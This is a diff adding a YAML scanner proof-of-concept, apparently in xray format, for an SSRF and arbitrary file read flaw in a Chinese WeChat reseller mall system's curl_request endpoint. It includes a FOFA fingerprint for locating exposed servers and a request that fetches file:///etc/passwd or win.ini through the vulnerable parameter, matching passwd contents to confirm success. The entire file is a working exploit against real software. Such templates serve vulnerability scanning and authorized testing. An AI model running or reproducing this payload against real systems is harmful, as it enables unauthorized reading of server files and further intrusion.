@@ -1,0 +1,24 @@
+id: poc-yaml-internet-wechat-business-address-ssrf
+info:
+  name: 微商代理商补货商城系统 curl_request接口存在任意文件读取漏洞
+  severity: high
+  tags:
+  - ssrf
+  finger: 微商代理商补货商城系统
+  fofa: /template/mobile/new/static/assets/js/comm.js
+variables:
+  r_data_linux: 'file:///etc/passwd
+
+    file:///c://windows/win.ini'
+firstRequest:
+  method: GET
+  path: /Mobile/User/login.html
+  expression: "status_code == 200 && \ncontains(body,\"/template/mobile/new/static/assets/js/comm.js\"\
+    )\n"
+requests:
+- method: GET
+  path: /Mobile/address/curl_request?url={{.r_data_linux}}
+  expression: "status_code == 200 &&\n((\ncontains(body, \"bit app support\") && \n\
+    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nmatches(body,\
+    \ \"root:.*:0:0:\")\n))\n"
+transport: http
